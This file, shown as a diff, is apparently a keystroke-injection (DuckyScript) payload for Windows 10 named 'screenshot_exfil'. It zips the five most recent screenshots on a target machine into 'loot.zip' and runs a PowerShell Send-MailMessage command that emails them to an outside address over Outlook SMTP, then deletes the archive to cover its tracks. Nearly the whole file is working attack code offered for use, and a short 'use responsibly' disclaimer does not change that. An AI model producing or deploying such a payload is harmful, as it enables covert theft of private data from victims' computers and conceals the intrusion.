@@ -1,0 +1,65 @@
+REM Title: screenshot_exfil
+REM Author: the-jcksn
+REM Description: Creates zip folder of 5 most recent screenshots and sends them via outlook email.
+REM Target: Windows 10
+REM Version: 1.0
+REM Category: Exfiltration
+
+REM ~~~~ You must change the USER_EMAIL and USER_PASSWORD to your outlook credentials.
+REM ~~~~ Can exfil more than 5, but I chose 5 to keep file sizes low.
+REM ~~~~ Can exfil from directory other than screenshots by changing path on lines 18, 57, and 61.
+REM ~~~~ You might have to adjust the delays, depending on the target machine, but these worked ok for me.
+REM ~~~~ Use responsibly, and within the confines of the law.
+
+DELAY 2000
+GUI r
+DELAY 200
+REM navigating to the directory to exfil from - change the following if you do not want the latest screenshots
+STRING %USERPROFILE%\Pictures\Screenshots
+ENTER
+DELAY 150
+REM sorting the files by date
+MENU
+DELAY 150
+STRING o
+DELAY 150
+DOWNARROW
+DELAY 150
+ENTER
+DELAY 150
+REM selecting files to exfil, repeat this line if you want more than 5, but bear in mind this might impact some of the delays
+SHIFT RIGHTARROW
+SHIFT RIGHTARROW
+SHIFT RIGHTARROW
+SHIFT RIGHTARROW
+DELAY 150
+REM sending files to loot.zip
+MENU
+DELAY 150
+STRING n
+DELAY 200
+DOWNARROW
+DELAY 150
+ENTER
+DELAY 500
+STRING loot
+ENTER
+DELAY 150
+ALT F4
+DELAY 150
+GUI r
+DELAY 150
+REM open powershell and send the email
+STRING powershell
+ENTER
+DELAY 500
+REM ~~~~~~~CHANGE THE USERNAME (3 times) AND PASSWORD (once) IN THE FOLLOWING~~~~~
+STRING Send-MailMessage -From user@example.com -To user@example.com -Subject "Photo loot" -Body "Please find attached your zip file" -Attachment "Pictures\Screenshots\loot.zip" -SmtpServer smtp-mail.outlook.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList user@example.com, (ConvertTo-SecureString -String "supersecretpassword" -AsPlainText -Force))
+ENTER
+DELAY 500
+REM cleanup
+STRING del Pictures\Screenshots\loot.zip
+ENTER
+DELAY 150
+STRING exit
+ENTER
